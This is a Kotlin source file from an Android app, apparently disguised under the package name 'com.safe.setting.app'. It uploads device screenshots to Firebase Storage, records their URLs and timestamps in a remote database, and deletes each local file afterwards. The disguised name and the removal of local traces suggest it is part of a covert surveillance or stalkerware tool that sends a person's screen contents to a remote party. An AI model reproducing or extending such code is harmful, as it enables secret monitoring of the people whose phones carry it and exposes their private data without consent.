package com.safe.setting.app.services.screenshot

import android.content.Context
import android.net.Uri
import com.safe.setting.app.data.model.Screenshot
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.services.base.BaseInteractorService
import com.safe.setting.app.utils.Consts
import java.io.File
import java.util.Date
import javax.inject.Inject

class InteractorScreenshot<S : InterfaceServiceScreenshot> @Inject constructor(
    private val firebase: InterfaceFirebase,
    context: Context
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorScreenshot<S> {

    override fun uploadScreenshot(file: File) {
        val fileUri = Uri.fromFile(file)
        val ref = firebase.getStorageReference("screenshots/${file.name}")

        ref.putFile(fileUri)
            .continueWithTask { task ->
                if (!task.isSuccessful) { task.exception?.let { throw it } }
                ref.downloadUrl
            }
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val downloadUri = task.result
                    val screenshot = Screenshot(
                        url = downloadUri.toString(),
                        fileName = file.name,
                        date = Date().time
                    )
                    firebase.getDatabaseReference(Consts.SCREENSHOTS).push().setValue(screenshot)
                }
                file.delete()
            }
    }
}